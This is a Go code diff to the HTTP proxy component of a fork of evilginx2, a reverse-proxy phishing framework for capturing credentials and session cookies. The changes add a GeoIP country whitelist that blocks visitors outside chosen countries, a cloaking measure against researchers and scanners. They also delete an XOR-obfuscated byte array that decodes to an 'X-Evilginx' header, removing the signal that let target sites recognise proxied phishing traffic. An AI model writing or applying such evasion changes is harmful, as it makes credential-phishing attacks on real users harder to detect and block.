@@ -35,9 +35,10 @@ import (
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
 	"github.com/mwitkow/go-http-dialer"
+  	geoip2 "github.com/oschwald/geoip2-golang"
 
-	"github.com/kgretzky/evilginx2/database"
-	"github.com/kgretzky/evilginx2/log"
+	"github.com/Brasco/evilginx2/database"
+	"github.com/Brasco/evilginx2/log"
 )
 
 const (
@@ -61,6 +62,8 @@ type HttpProxy struct {
 	cfg               *Config
 	db                *database.Database
 	bl                *Blacklist
+	wl                *Whitelist
+	geoip_db          *geoip2.Reader
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -81,7 +84,7 @@ type ProxySession struct {
 	Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, wl *Whitelist, geoip_db *geoip2.Reader, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -89,6 +92,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		cfg:               cfg,
 		db:                db,
 		bl:                bl,
+		wl:                wl,
+		geoip_db:          geoip_db,
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -148,6 +153,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
 				return p.blockRequest(req)
 			}
+			if !p.wl.IsIPFromWhitelistedCountry(from_ip, geoip_db) {
+				log.Warning("country whitelist: request from ip address '%s' was blocked", from_ip)
+				return p.blockRequest(req)
+			}
 			if p.cfg.GetBlacklistMode() == "all" {
 				err := p.bl.AddIP(from_ip)
 				if err != nil {
@@ -180,7 +189,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					pl_name = pl.Name
 				}
 
-				egg2 := req.Host
 				ps.PhishDomain = phishDomain
 				req_ok := false
 				// handle session
@@ -347,7 +355,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -374,9 +381,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				p.deleteRequestCookie(p.cookieName, req)
 
-				for n, b := range hg {
-					hg[n] = b ^ 0xCC
-				}
 				// replace "Host" header
 				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
@@ -404,7 +408,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
 				if pl != nil {
